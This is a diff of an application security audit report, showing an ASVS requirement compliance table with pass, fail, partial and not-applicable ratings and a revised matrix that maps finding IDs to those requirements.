+| 11.1.3 | Cryptographic Discovery Mechanisms | ❌ Fail |
+| 11.1.4 | Cryptographic Inventory with PQC Migration Plan | ❌ Fail |
+| 11.2.1 | Industry-Validated Cryptographic Implementations | ⚠️ Partial |
+| 11.2.2 | Crypto Agility | ❌ Fail |
+| 11.2.3 | Minimum 128-bits of Security | ⚠️ Partial |
+| 11.2.4 | Constant-Time Operations | ❌ Fail |
+| 11.2.5 | Secure Cryptographic Failure | ⚠️ Partial |
+| 11.3.1 | No Insecure Block Modes or Weak Padding | ✅ Pass |
+| 11.3.2 | Approved Ciphers and Modes | ⚠️ Partial |
+| 11.3.3 | Protection Against Unauthorized Modification | ✅ Pass |
+| 11.3.4 | Nonces, IVs, and Single-Use Numbers | ✅ Pass |
+| 11.3.5 | Encrypt-then-MAC Mode | ✅ Pass |
+| 11.4.1 | Approved Hash Functions | ⚠️ Partial |
+| 11.4.2 | Password Storage with Approved KDF | ⚠️ Partial |
+| 11.4.3 | Hash Functions for Digital Signatures / Data Integrity | ✅ Pass |
+| 11.4.4 | Approved KDF with Key Stretching for Key Derivation from Passwords | ⚠️ Partial |
+| 11.5.1 | Random Values - CSPRNG with 128-bit Entropy | ❌ Fail |
+| 11.5.2 | Random Number Generation Under Heavy Demand | ✅ Pass |
+| 11.6.1 | Approved Cryptographic Algorithms and Modes | ⚠️ Partial |
+| 11.6.2 | Approved Key Exchange Algorithms with Secure Parameters | N/A |
+| 11.7.1 | Full Memory Encryption for Sensitive Data In-Use | ❌ Fail |
+| 11.7.2 | Data Minimization and Immediate Encryption | ⚠️ Partial |
+| **10. OAuth & OIDC** |
+| 10.1.1 | Token Restriction to Required Components | ⚠️ Partial |
+| 10.1.2 | Transaction Binding and Client-Generated Secrets | ❌ Fail |
+| 10.2.1 | CSRF Protection for OAuth Code Flow | ❌ Fail |
+| 10.2.2 | Mix-Up Attack Defense | N/A |
+| 10.2.3 | Minimal Scope Requests | N/A |
+| 10.3.1 | Access Token Audience Validation | ⚠️ Partial |
+| 10.3.2 | OAuth Resource Server — Delegated Authorization Enforcement | ❌ Fail |
+| 10.3.3 | OAuth Resource Server — Unique User Identification | ⚠️ Partial |
+| 10.3.4 | OAuth Resource Server — Authentication Strength Verification | ❌ Fail |
+| 10.3.5 | OAuth Resource Server — Sender-Constrained Access Tokens | ❌ Fail |
+| 10.4.1 | OAuth Authorization Server — Redirect URI Validation | N/A |
+| 10.4.2 | OAuth Authorization Server — Authorization Code Single Use | N/A |
+| 10.4.3 | Authorization Code Short-Lived | N/A |
+| 10.4.4 | Only Allow Required Grants Per Client | ✅ Pass |
+| 10.4.5 | Refresh Token Replay Mitigation | ⚠️ Partial |
+| 10.4.6 | PKCE Required for Code Grant | ❌ Fail |
+| 10.4.7 | Mitigate Risk of Dynamic Client Registration | N/A |
+| 10.4.8 | Refresh Token Absolute Expiration | ⚠️ Partial |
+| 10.4.9 | Token Revocation UI | ❌ Fail |
+| 10.4.10 | Confidential Client Authentication for Backchannel Requests | ⚠️ Partial |
+| 10.4.11 | Required Scopes Only | ⚠️ Partial |
+| 10.4.12 | Response Mode Validation | ❌ Fail |
+| 10.4.13 | Code Grant with PAR | ❌ Fail |
+| 10.4.14 | Sender-Constrained Access Tokens | ❌ Fail |
+| 10.4.15 | OAuth Authorization Server - authorization_details integrity via PAR/JAR | ❌ Fail |
+| 10.4.16 | OAuth Authorization Server - Strong Client Authentication | ❌ Fail |
+| 10.5.1 | OIDC Client - ID Token Replay Attack Mitigation (nonce) | ❌ Fail |
+| 10.5.2 | OIDC Client - Unique User Identification from ID Token | ⚠️ Partial |
+| 10.5.3 | OIDC Client - Issuer Validation Against Pre-configured URL | ❌ Fail |
+| 10.5.4 | OIDC Client - Audience (aud) Validation in ID Token | ❌ Fail |
+| 10.5.5 | OIDC Back-Channel Logout | ❌ Fail |
+| 10.6.1 | OpenID Provider Response Modes | N/A |
+| 10.6.2 | OpenID Provider DoS Mitigation via Forced Logout | N/A |
+| 10.7.1 | User Consent for Authorization Requests | N/A |
+| 10.7.2 | Consent Information Presentation | N/A |
+| 10.7.3 | User Consent Review, Modification, and Revocation | N/A |
+| **6. Authentication** |
+| 6.1.1 | Authentication Documentation - Rate Limiting and Anti-Automation | ❌ Fail |
+| 6.1.2 | Authentication Documentation - Context-Specific Password Deny List | ❌ Fail |
+| 6.1.3 | Authentication Documentation - Multiple Authentication Pathways | ❌ Fail |
+| 6.2.1 | Password Security - Minimum Length | ✅ Pass |
+| 6.2.2 | Password Security - Password Change Capability | ✅ Pass |
+| 6.2.3 | Password Security - Password Change Requires Current Password | N/A |
+| 6.2.4 | Password Blocklist Check | N/A |
+| 6.2.5 | No Password Composition Rules | ✅ Pass |
+| 6.2.6 | Password Field Masking (type=password) | N/A |
+| 6.2.7 | Paste and Password Manager Support | ✅ Pass |
+| 6.2.8 | No Password Modification Before Verification | ✅ Pass |
+| 6.2.9 | Support Passwords of 64+ Characters | N/A |
+| 6.2.10 | Password Validity (No Periodic Rotation) | ✅ Pass |
+| 6.2.11 | Context-Specific Word List for Password Prevention | N/A |
+| 6.2.12 | Breached Password Checking | N/A |
+| 6.3.1 | Controls Against Credential Stuffing and Brute Force | ⚠️ Partial |
+| 6.3.2 | Default User Accounts | ⚠️ Partial |
+| 6.3.3 | Multi-Factor Authentication | ⚠️ Partial |
+| 6.3.4 | Multiple Authentication Pathways Consistency | ❌ Fail |
+| 6.3.5 | Suspicious Authentication Attempt Notifications | ❌ Fail |
+| 6.3.6 | Email Not Used as Authentication Mechanism | ✅ Pass |
+| 6.3.7 | Notification After Authentication Detail Updates | ❌ Fail |
+| 6.3.8 | User Enumeration Prevention | ✅ Pass |
+| 6.4.1 | System Generated Initial Passwords/Activation Codes | ✅ Pass |
+| 6.4.2 | Password Hints and Knowledge-Based Authentication | ✅ Pass |
+| 6.4.3 | Secure Password Reset Process | N/A |
+| 6.4.4 | MFA Factor Loss Identity Proofing | N/A |
+| 6.4.5 | Authentication Mechanism Renewal Instructions | ⚠️ Partial |
+| 6.4.6 | Administrative Password Reset Without Knowledge | N/A |
+| 6.5.1 | Single-Use Authentication Codes | ⚠️ Partial |
+| 6.5.2 | Lookup Secret Storage Hashing | N/A |
+| 6.5.3 | CSPRNG for Secret Generation | ✅ Pass |
+| 6.5.4 | Minimum Entropy for Lookup Secrets and OOB Codes | N/A |
+| 6.5.5 | Defined Lifetime for OOB and TOTP | N/A |
+| 6.5.6 | Revocability of Authentication Factors | ⚠️ Partial |
+| 6.5.7 | Biometric Authentication as Secondary Only | ✅ Pass |
+| 6.5.8 | Time-based One-time Passwords Time Source | N/A |
+| 6.6.1 | PSTN/SMS OTP Restrictions | N/A |
+| 6.6.2 | Out-of-Band Code Binding to Original Request | ✅ Pass |
+| 6.6.3 | Rate Limiting for Code-based Out-of-Band Auth | N/A |
+| 6.6.4 | Push Notification Rate Limiting | N/A |
+| 6.7.1 | Certificate Storage Protection for Cryptographic Auth | N/A |
+| 6.7.2 | Challenge Nonce Requirements for Cryptographic Authentication | N/A |
+| 6.8.1 | Identity Spoofing Across Multiple IdPs | ⚠️ Partial |
+| 6.8.2 | Digital Signature Validation on Authentication Assertions | ❌ Fail |
+| 6.8.3 | SAML Assertion Replay Prevention | ⚠️ Partial |
+| 6.8.4 | Authentication Strength Verification from IdP | ❌ Fail |
+| **7. Session Management** |
+| 7.1.1 | Session Inactivity Timeout and Maximum Lifetime Documentation | ❌ Fail |
+| 7.1.2 | Concurrent Session Limits Documentation | ❌ Fail |
+| 7.1.3 | Federated Identity Management Documentation | ❌ Fail |
+| 7.2.1 | Backend Session Token Verification | ✅ Pass |
+| 7.2.2 | Dynamic Session Tokens | ✅ Pass |
+| 7.2.3 | Reference Token Entropy (128 bits, CSPRNG) | ⚠️ Partial |
+| 7.2.4 | New Session Token on Authentication | ❌ Fail |
+| 7.3.1 | Session Inactivity Timeout | ❌ Fail |
+| 7.3.2 | Absolute Maximum Session Lifetime | ❌ Fail |
+| 7.4.1 | Session Termination Enforcement | ❌ Fail |
+| 7.4.2 | Session Termination on Account Disable/Delete | ❌ Fail |
+| 7.4.3 | Session Termination After Authentication Factor Change | ❌ Fail |
+| 7.4.4 | Visible Logout Functionality | ❌ Fail |
+| 7.4.5 | Session Termination by Administrators | ❌ Fail |
+| 7.5.1 | Re-authentication Before Sensitive Account Changes | ⚠️ Partial |
+| 7.5.2 | Users Can View and Terminate Active Sessions | ❌ Fail |
+| 7.5.3 | Further Authentication for Sensitive Transactions | ❌ Fail |
+| 7.6.1 | Session Lifetime and Termination Between RPs and IdPs | ❌ Fail |
+| 7.6.2 | Session Creation Requires User Consent or Explicit Action | ⚠️ Partial |
+| **8. Authorization** |
+| 8.1.1 | Authorization Documentation - Function-level and Data-specific Access | ⚠️ Partial |
+| 8.1.2 | Authorization Documentation - Field-level Access Restrictions | ❌ Fail |
+| 8.1.3 | Authorization Documentation - Environmental and Contextual Attributes | ❌ Fail |
+| 8.1.4 | Authorization Documentation - Environmental Factors in Decision-Making | ❌ Fail |
+| 8.2.1 | General Authorization Design - Function-level Access | ❌ Fail |
+| 8.2.2 | General Authorization Design - Data-specific Access (IDOR/BOLA) | ❌ Fail |
+| 8.2.3 | Field-Level Access Control (BOPLA) | ❌ Fail |
+| 8.2.4 | Adaptive Security Controls | ❌ Fail |
+| 8.3.1 | Server-Side Authorization Enforcement | ❌ Fail |
+| 8.3.2 | Immediate Authorization Change Application | ❌ Fail |
+| 8.3.3 | Subject-Based Permissions (Not Intermediary) | ✅ Pass |
+| 8.4.1 | Multi-Tenant Cross-Tenant Controls | ❌ Fail |
+| 8.4.2 | Administrative Interface Multi-Layer Security | ❌ Fail |
+| **1. Injection Prevention** |
+| 1.1.1 | Encoding and Sanitization Architecture - Canonical Decoding | ⚠️ Partial |
+| 1.1.2 | Encoding and Sanitization Architecture - Output Encoding as Final Step | ❌ Fail |
+| 1.2.1 | Injection Prevention - Context-Appropriate Output Encoding | ❌ Fail |
+| 1.2.2 | Injection Prevention - URL Encoding for Dynamic URLs | ❌ Fail |
+| 1.2.3 | Injection Prevention - JavaScript Content Encoding | ❌ Fail |
+| 1.2.4 | Injection Prevention - Parameterized Queries | ✅ Pass |
+| 1.2.5 | OS Command Injection Prevention | ✅ Pass |
+| 1.2.6 | LDAP Injection Prevention | ⚠️ Partial |
+| 1.2.7 | XPath Injection Prevention | ✅ Pass |
+| 1.2.8 | LaTeX Injection Prevention | ✅ Pass |
+| 1.2.9 | Regex Special Character Escaping | ✅ Pass |
+| 1.2.10 | CSV and Formula Injection Prevention | ✅ Pass |
+| 1.3.1 | HTML Sanitization | ❌ Fail |
+| 1.3.2 | Dynamic Code Execution | ✅ Pass |
+| 1.3.3 | Dangerous Context Sanitization | ❌ Fail |
+| 1.3.4 | SVG Content Sanitization | ⚠️ Partial |
+| 1.3.5 | Scriptable/Expression Template Language Content | ❌ Fail |
+| 1.3.6 | SSRF Protection | ✅ Pass |
+| 1.3.7 | Template Injection Protection | ✅ Pass |
+| 1.3.8 | JNDI Injection Protection | N/A |
+| 1.3.9 | Memcache Injection Protection | N/A |
+| 1.3.10 | Format String Protection | ✅ Pass |
+| 1.3.11 | SMTP/IMAP Injection Protection | ⚠️ Partial |
+| 1.3.12 | ReDoS Protection | ✅ Pass |
+| 1.4.1 | Memory-Safe String and Pointer Operations | ✅ Pass |
+| 1.4.2 | Integer Overflow Prevention | ✅ Pass |
+| 1.4.3 | Memory and Resource Release | ✅ Pass |
+| 1.5.1 | XML Parser Restrictive Configuration | ✅ Pass |
+| 1.5.2 | Safe Deserialization | ⚠️ Partial |
+| 1.5.3 | Parser Consistency | ✅ Pass |
+| **2. Validation & Business Logic** |
+| 2.1.1 | Validation and Business Logic Documentation - Input Validation Rules | ⚠️ Partial |
+| 2.1.2 | Validation and Business Logic Documentation - Contextual Consistency | ❌ Fail |
+| 2.1.3 | Validation and Business Logic Documentation - Business Logic Limits | ❌ Fail |
+| 2.2.1 | Input Validation | ❌ Fail |
+| 2.2.2 | Input Validation at Trusted Service Layer | ❌ Fail |
+| 2.2.3 | Combinations of Related Data Items | ❌ Fail |
+| 2.3.1 | Business Logic Sequential Step Order | ❌ Fail |
+| 2.3.2 | Business Logic Limits | ❌ Fail |
+| 2.3.3 | Transaction Usage at Business Logic Level | ❌ Fail |
+| 2.3.4 | Business Logic Locking (Double-Booking Prevention) | ❌ Fail |
+| 2.3.5 | Multi-User Approval for High-Value Operations | ❌ Fail |
+| 2.4.1 | Anti-Automation Controls | ❌ Fail |
+| 2.4.2 | Anti-Automation: Realistic Human Timing Controls | ❌ Fail |
+| **3. Web Frontend Security** |
+| 3.1.1 | Web Frontend Security Documentation | ❌ Fail |
+| 3.2.1 | Unintended Content Interpretation | ❌ Fail |
+| 3.2.2 | Unintended Content Interpretation - Safe Text Rendering | ❌ Fail |
+| 3.2.3 | DOM Clobbering Prevention | ⚠️ Partial |
+| 3.3.1 | Cookie Secure Attribute | ❌ Fail |
+| 3.3.2 | Cookie SameSite Attribute | ❌ Fail |
+| 3.3.3 | Cookie __Host- Prefix | ❌ Fail |
+| 3.3.4 | Cookie HttpOnly Attribute | ❌ Fail |
+| 3.3.5 | Cookie Size Limit (≤ 4096 bytes) | ⚠️ Partial |
+| 3.4.1 | Strict-Transport-Security (HSTS) Header | ❌ Fail |
+| 3.4.2 | CORS Access-Control-Allow-Origin Header | ⚠️ Partial |
+| 3.4.3 | Content-Security-Policy Header | ❌ Fail |
+| 3.4.4 | X-Content-Type-Options: nosniff | ❌ Fail |
+| 3.4.5 | Referrer-Policy | ❌ Fail |
+| 3.4.6 | Content-Security-Policy frame-ancestors | ❌ Fail |
+| 3.4.7 | CSP report-uri/report-to | ❌ Fail |
+| 3.4.8 | Cross-Origin-Opener-Policy | ❌ Fail |
+| 3.5.1 | CSRF / Browser Origin Separation | ❌ Fail |
+| 3.5.2 | CORS Preflight Mechanism | ❌ Fail |
+| 3.5.3 | HTTP Methods for Sensitive Functionality | ❌ Fail |
+| 3.5.4 | Separate Applications on Different Hostnames | ⚠️ Partial |
+| 3.5.5 | postMessage Validation | ✅ Pass |
+| 3.5.6 | JSONP Not Enabled | ✅ Pass |
+| 3.5.7 | Authorization Data Not in Script Resources | ✅ Pass |
+| 3.5.8 | Browser Origin Separation | ❌ Fail |
+| 3.6.1 | External Resource Integrity | ⚠️ Partial |
+| 3.7.1 | Supported Client-Side Technologies | ✅ Pass |
+| 3.7.2 | Redirect Allowlist for External Domains | ❌ Fail |
+| 3.7.3 | Notification for External URL Navigation | ❌ Fail |
+| 3.7.4 | HSTS Preload | ❌ Fail |
+| 3.7.5 | Browser Security Feature Detection | ❌ Fail |
+| **12. TLS** |
+| 12.1.1 | General TLS Security Guidance - TLS Protocol Versions | ❌ Fail |
+| 12.1.2 | General TLS Security Guidance - Cipher Suites | ❌ Fail |
+| 12.1.3 | General TLS Security Guidance - mTLS Client Certificate Validation | N/A |
+| 12.1.4 | General TLS Security Guidance - Certificate Revocation (OCSP Stapling) | ❌ Fail |
+| 12.1.5 | General TLS Security Guidance - Encrypted Client Hello (ECH) | ❌ Fail |
+| 12.2.1 | HTTPS Communication with External Facing Services | ❌ Fail |
+| 12.2.2 | HTTPS Communication with External Facing Services | ❌ Fail |
+| 12.3.1 | General Service to Service Communication Security | ❌ Fail |
+| 12.3.2 | TLS Certificate Validation by Clients | ⚠️ Partial |
+| 12.3.3 | TLS for Internal HTTP-based Services | ⚠️ Partial |
+| 12.3.4 | Trusted Certificates for Internal Service TLS | ❌ Fail |
+| 12.3.5 | Strong Authentication for Intra-Service Communications | ❌ Fail |
+| **13. Configuration & Deployment** |
+| 13.1.1 | Communication Needs Documentation | ❌ Fail |
+| 13.1.2 | Connection Pool Limits and Fallback | ❌ Fail |
+| 13.1.3 | Resource Management Strategies | ❌ Fail |
+| 13.1.4 | Secrets Documentation and Rotation | ⚠️ Partial |
+| 13.2.1 | Backend Communication Authentication | ⚠️ Partial |
+| 13.2.2 | Least Privilege for Backend Communications | ❌ Fail |
+| 13.2.3 | Default Credentials for Service Authentication | ✅ Pass |
+| 13.2.4 | Allowlist for External Resources | ⚠️ Partial |
+| 13.2.5 | Server Allowlist Configuration | ❌ Fail |
+| 13.2.6 | Connection Configuration | ❌ Fail |
+| 13.3.1 | Secrets Management Solution | ❌ Fail |
+| 13.3.2 | Least Privilege Access to Secrets | ⚠️ Partial |
+| 13.3.3 | Cryptographic Operations Using Isolated Security Module | ❌ Fail |
+| 13.3.4 | Secret Expiration and Rotation | ❌ Fail |
+| 13.4.1 | No Source Control Metadata Deployed | ❌ Fail |
+| 13.4.2 | Debug Modes Disabled in Production | ❌ Fail |
+| 13.4.3 | Web Servers Do Not Expose Directory Listings | ✅ Pass |
+| 13.4.4 | HTTP TRACE Method Not Supported | ⚠️ Partial |
+| 13.4.5 | Unintended Information Leakage — Documentation and Monitoring Endpoints | ⚠️ Partial |
+| 13.4.6 | Unintended Information Leakage — Version Information | ❌ Fail |
+| 13.4.7 | Unintended Information Leakage — File Extension Filtering | ⚠️ Partial |
+| **14. Data Protection** |
+| 14.1.1 | Sensitive Data Classification | ⚠️ Partial |
+| 14.1.2 | Documented Protection Requirements | ❌ Fail |
+| 14.2.1 | Sensitive Data Only in HTTP Body/Headers | ⚠️ Partial |
+| 14.2.2 | Prevent Sensitive Data Caching | ❌ Fail |
+| 14.2.3 | Sensitive Data Not Sent to Untrusted Parties | ✅ Pass |
+| 14.2.4 | Protection Controls Implementation | ⚠️ Partial |
+| 14.2.5 | Web Cache Deception Prevention | ❌ Fail |
+| 14.2.6 | Minimum Sensitive Data Return | ❌ Fail |
+| 14.2.7 | Data Retention Classification | ❌ Fail |
+| 14.2.8 | File Metadata Stripping | ❌ Fail |
+| 14.3.1 | Client Storage Clearing | ❌ Fail |
+| 14.3.2 | Anti-Caching Headers for Sensitive Data | ❌ Fail |
+| 14.3.3 | Browser Storage Does Not Contain Sensitive Data | ⚠️ Partial |
+| **15. Supply Chain & Dependencies** |
+| 15.1.1 | Risk-Based Remediation Timeframes | ❌ Fail |
+| 15.1.2 | SBOM and Inventory Catalog | ❌ Fail |
+| 15.1.3 | Documentation of Resource-Demanding Functionality | ❌ Fail |
+| 15.1.4 | Documentation of Risky Components | ❌ Fail |
+| 15.1.5 | Documentation of Dangerous Functionality | ❌ Fail |
+| 15.2.1 | Components Within Remediation Timeframes | ❌ Fail |
+| 15.2.2 | Defenses Against Loss of Availability | ⚠️ Partial |
+| 15.2.3 | No Extraneous Functionality in Production | ❌ Fail |
+| 15.2.4 | No Dependency Confusion Risk | ⚠️ Partial |
+| 15.2.5 | Protections Around Dangerous Functionality | ⚠️ Partial |
+| 15.3.1 | Return Only Required Data Fields | N/A |
+| 15.3.2 | Backend Calls to External URLs Do Not Follow Redirects | ⚠️ Partial |
+| 15.3.3 | Mass Assignment Protection | ⚠️ Partial |
+| 15.3.4 | IP Address Handling Through Proxies | N/A |
+| 15.3.5 | Type Safety and Strict Comparisons | ⚠️ Partial |
+| 15.3.6 | Prototype Pollution Prevention | N/A |
+| 15.3.7 | HTTP Parameter Pollution Defense | ⚠️ Partial |
+| 15.4.1 | Safe Concurrency for Shared Objects | ❌ Fail |
+| 15.4.2 | TOCTOU Race Condition Prevention | ⚠️ Partial |
+| 15.4.3 | Consistent Lock Usage and Encapsulation | ❌ Fail |
+| 15.4.4 | Thread Starvation Prevention | ⚠️ Partial |
+| **16. Logging & Error Handling** |
+| 16.1.1 | Security Logging Documentation | ❌ Fail |
+| 16.2.1 | General Logging - Metadata Requirements | ❌ Fail |
+| 16.2.2 | Time Synchronization and UTC Timestamps | ❌ Fail |
+| 16.2.3 | Logs Only to Documented Destinations | ❌ Fail |
+| 16.2.4 | Logs Readable and Correlatable by Log Processor | ⚠️ Partial |
+| 16.2.5 | Sensitive Data Protection in Logs | ❌ Fail |
+| 16.3.1 | Authentication Operations Logging | ❌ Fail |
+| 16.3.2 | Authorization Failure Logging | ❌ Fail |
+| 16.3.3 | Security Events and Bypass Attempts Logging | ❌ Fail |
+| 16.3.4 | Unexpected Errors and Security Control Failures Logging | ❌ Fail |
+| 16.4.1 | Log Injection Prevention | ❌ Fail |
+| 16.4.2 | Log Protection from Unauthorized Access and Modification | ❌ Fail |
+| 16.4.3 | Log Protection - Secure Transmission | ❌ Fail |
+| 16.5.1 | Error Handling - Generic Messages | ⚠️ Partial |
+| 16.5.2 | Error Handling - External Resource Failure | ❌ Fail |
+| 16.5.3 | Error Handling - Fail Gracefully and Securely | ❌ Fail |
+| 16.5.4 | Error Handling - Last Resort Error Handler | ❌ Fail |
+| **4. HTTP Security** |
+| 4.1.1 | Content-Type Header Verification | N/A |
+| 4.1.2 | HTTP to HTTPS Redirect Behavior | ✅ Pass |
+| 4.1.3 | Intermediary Header Override Protection | ⚠️ Partial |
+| 4.1.4 | HTTP Method Restriction | ⚠️ Partial |
+| 4.1.5 | Per-Message Digital Signatures | ❌ Fail |
+| 4.2.1 | HTTP Request Smuggling Prevention | ⚠️ Partial |
+| 4.2.2 | Content-Length Header Validation | N/A |
+| 4.2.3 | HTTP/2 and HTTP/3 Connection-Specific Header Fields | ✅ Pass |
+| 4.2.4 | CR/LF/CRLF Injection in HTTP/2 and HTTP/3 Headers | N/A |
+| 4.2.5 | URI and Header Field Length Validation | N/A |
+| 4.3.1 | GraphQL DoS Prevention | N/A |
+| 4.3.2 | GraphQL Introspection Disabled in Production | N/A |
+| 4.4.1 | WebSocket over TLS (WSS) | N/A |
+| 4.4.2 | Origin Header Validation on WebSocket Handshake | N/A |
+| 4.4.3 | Dedicated WebSocket Session Tokens | N/A |
+| 4.4.4 | WebSocket Token Validation via Authenticated HTTPS | N/A |
+| **5. File Handling** |
+| 5.1.1 | File Handling Documentation | ❌ Fail |
+| 5.2.1 | File Size Limits | ❌ Fail |
+| 5.2.2 | File Extension and Content Validation | ❌ Fail |
+| 5.2.3 | Compressed File Checks | ❌ Fail |
+| 5.2.4 | File Size Quota and Maximum File Count Per User | ❌ Fail |
+| 5.2.5 | Symlink Prevention in Compressed Files | ❌ Fail |
+| 5.2.6 | Pixel Flood Attack Prevention | N/A |
+| 5.3.1 | Uploaded Files Not Executed as Server-Side Code | ⚠️ Partial |
+| 5.3.2 | Path Traversal Protection | ⚠️ Partial |
+| 5.3.3 | Zip Slip Protection | ✅ Pass |
+| 5.4.1 | Filename Validation in Downloads | ❌ Fail |
+| 5.4.2 | Filename Encoding/Sanitization in Responses | ❌ Fail |
+| 5.4.3 | Antivirus Scanning | ❌ Fail |
+| **17. Real-Time Communications** |
+| 17.1.1 | TURN Service IP Address Filtering | N/A |
+| 17.1.2 | TURN Service Resource Exhaustion Protection | N/A |
+| 17.2.1 | DTLS certificate key management and protection | N/A |
+| 17.2.2 | DTLS cipher suites and DTLS-SRTP configuration | N/A |
+| 17.2.3 | Secure Real-time Transport Protocol (SRTP) authentication | N/A |
+| 17.2.4 | Media server SRTP malformed packet handling | N/A |
+| 17.2.5 | Media Server SRTP Flood Resilience | N/A |
+| 17.2.6 | DTLS ClientHello Race Condition Vulnerability | N/A |
+| 17.2.7 | Recording Mechanism SRTP Flood Resilience | N/A |
+| 17.2.8 | DTLS Certificate Verification Against SDP Fingerprint | N/A |
+| 17.3.1 | Signaling Server Flood Resilience with Rate Limiting | N/A |
+| 17.3.2 | Signaling Server Malformed Message Resilience | N/A |
+| **9. Token-Based Session Management** |
+| 9.1.1 | Token Signature Validation | ⚠️ Partial |
+| 9.1.2 | Algorithm Allowlist for Token Verification | ❌ Fail |
+| 9.1.3 | Key Material from Trusted Pre-configured Sources | ❌ Fail |
+| 9.2.1 | Token Validity Time Span Verification | ⚠️ Partial |
+| 9.2.2 | Token Type Verification | ❌ Fail |
+| 9.2.3 | Token Audience Validation | ❌ Fail |
+| 9.2.4 | Token Audience Restriction | ❌ Fail |
+
+---
 
 # 6. Cross-Reference Matrix
 
@@ -6971,568 +7120,526 @@ The application serves static assets locally via `STATICDIR = THIS_DIR / 'static
 
 | Finding ID | ASVS Requirements |
 |------------|-------------------|
-| | 8.2.1, 8.2.2, 8.3.1, 8.4.1, 8.4.2, 6.3.4, 2.3.2 |
-| | 8.2.1, 8.3.1, 8.4.2, 2.2.2, 2.3.1, 3.5.1, 3.5.3, 3.5.8 |
-| | 1.2.1, 1.2.3 |
-| | 3.2.2, 1.3.1, 1.3.3 |
-| | 3.5.1, 2.4.1, 8.4.2 |
-| | 3.4.1, 3.7.4, 12.2.1 |
-| | 2.2.1, 2.3.2, 1.3.3, 16.5.3, 15.2.3 |
-| | 2.3.1, 8.3.1, 16.5.3, 15.4.3 |
+| | 10.1.2, 10.2.1, 2.2.2, 3.5.1, 3.5.3, 13.3.1, 13.4.2, 2.4.1 |
+| | 7.4.1 |
+| | 8.2.2, 8.4.1, 8.2.3, 8.4.2 |
+| | 1.1.2, 1.2.1, 1.3.1, 3.2.2, 1.3.7 |
+| | 3.5.8 |
+| | 2.4.1, 2.4.2, 16.3.3 |
 | | 16.3.2 |
-| FINDING-010 | 11.2.2 |
-| FINDING-011 | 11.2.4 |
-| FINDING-012 | 13.3.1, 13.3.3 |
-| FINDING-013 | 13.3.2 |
-| FINDING-014 | 13.3.4 |
-| FINDING-015 | 14.2.7 |
-| FINDING-016 | 10.4.10, 10.4.16 |
-| FINDING-017 | 10.5.4, 9.2.4 |
-| FINDING-018 | 6.3.4 |
-| FINDING-019 | 6.3.4 |
-| FINDING-020 | 8.2.2, 8.3.1, 2.2.3 |
-| FINDING-021 | 8.2.3, 8.4.2 |
-| FINDING-022 | 8.4.1 |
-| FINDING-023 | 7.3.2 |
-| FINDING-024 | 7.4.1, 6.5.6 |
-| FINDING-025 | 7.4.2 |
-| FINDING-026 | 7.4.5 |
-| FINDING-027 | 7.5.2 |
-| FINDING-028 | 7.5.3 |
-| FINDING-029 | 7.6.2 |
-| FINDING-030 | 1.2.1, 3.2.3 |
-| FINDING-031 | 1.2.1 |
-| FINDING-032 | 1.1.2 |
-| FINDING-033 | 3.2.2, 1.3.1, 1.3.3, 1.3.5 |
-| FINDING-034 | 3.2.2 |
-| FINDING-035 | 3.2.1 |
-| FINDING-036 | 3.5.8 |
-| FINDING-037 | 3.3.1, 3.3.2, 3.3.3, 3.3.4 |
-| FINDING-038 | 3.4.3, 3.4.7 |
-| FINDING-039 | 3.4.6 |
-| FINDING-040 | 3.4.8 |
-| FINDING-041 | 12.1.1 |
-| FINDING-042 | 12.1.2 |
-| FINDING-043 | 12.2.1, 12.3.1, 12.2.2 |
-| FINDING-044 | 2.2.1 |
-| FINDING-045 | 2.2.1 |
-| FINDING-046 | 2.3.3, 16.5.3 |
-| FINDING-047 | 2.3.3, 15.4.2 |
-| FINDING-048 | 2.2.3 |
-| FINDING-049 | 5.2.1 |
-| FINDING-050 | 5.2.2, 5.3.1 |
-| FINDING-051 | 16.1.1 |
-| FINDING-052 | 16.2.1 |
-| FINDING-053 | 16.2.1, 16.4.3 |
-| FINDING-054 | 16.2.5 |
-| FINDING-055 | 16.3.1 |
-| FINDING-056 | 16.3.2 |
-| FINDING-057 | 16.3.2 |
-| FINDING-058 | 16.3.3, 16.3.4 |
-| FINDING-059 | 16.3.3 |
-| FINDING-060 | 16.4.1, 1.3.10 |
-| FINDING-061 | 16.4.3 |
-| FINDING-062 | 16.5.2 |
-| FINDING-063 | 16.5.3 |
-| FINDING-064 | 16.5.4 |
-| FINDING-065 | 13.4.2, 15.2.3 |
-| FINDING-066 | 15.1.1 |
-| FINDING-067 | 15.1.2, 15.2.4 |
-| FINDING-068 | 15.1.3 |
-| FINDING-069 | 15.2.1 |
-| FINDING-070 | 15.2.2 |
-| FINDING-071 | 15.2.4 |
-| FINDING-072 | 15.3.4 |
-| FINDING-073 | 15.4.1 |
-| FINDING-074 | 15.4.2, 2.3.4 |
-| FINDING-075 | 15.4.3 |
-| FINDING-076 | 15.4.4, 2.4.1, 2.4.2, 6.3.1 |
-| FINDING-077 | 9.2.4 |
-| FINDING-078 | 9.2.4 |
-| FINDING-079 | 14.3.2 |
-| FINDING-080 | 11.1.1 |
-| FINDING-081 | 11.1.2 |
-| FINDING-082 | 11.1.3 |
-| FINDING-083 | 11.1.4 |
-| FINDING-084 | 11.2.1, 11.2.4, 11.4.2, 11.4.4, 11.6.1, 15.2.1 |
-| FINDING-085 | 11.2.3, 11.5.1, 7.2.3 |
-| FINDING-086 | 11.2.5 |
-| FINDING-087 | 11.3.2 |
-| FINDING-088 | 13.3.1 |
-| FINDING-089 | 13.3.3 |
-| FINDING-090 | 13.3.4 |
-| FINDING-091 | 11.7.1 |
-| FINDING-092 | 14.1.1, 14.1.2 |
-| FINDING-093 | 14.2.4 |
-| FINDING-094 | 14.2.4 |
-| FINDING-095 | 14.2.7 |
-| FINDING-096 | 14.2.7 |
-| FINDING-097 | 10.1.2, 10.2.1, 10.4.6, 10.4.4 |
-| FINDING-098 | 10.3.2 |
-| FINDING-099 | 10.3.3 |
-| FINDING-100 | 10.3.4, 6.8.4, 8.4.2 |
-| FINDING-101 | 10.3.5, 10.4.14 |
-| FINDING-102 | 10.4.13, 10.4.15 |
-| FINDING-103 | 10.5.1 |
-| FINDING-104 | 6.3.3 |
-| FINDING-105 | 6.8.2 |
-| FINDING-106 | 6.3.7 |
-| FINDING-107 | 6.3.5 |
-| FINDING-108 | 8.2.1 |
-| FINDING-109 | 8.2.2 |
-| FINDING-110 | 8.2.3 |
+| FINDING-008 | 11.2.2 |
+| FINDING-009 | 11.2.4 |
+| FINDING-010 | 10.3.2 |
+| FINDING-011 | 10.3.2, 8.2.1, 8.3.1, 8.4.2, 8.2.2, 2.3.2 |
+| FINDING-012 | 10.4.6 |
+| FINDING-013 | 10.5.1 |
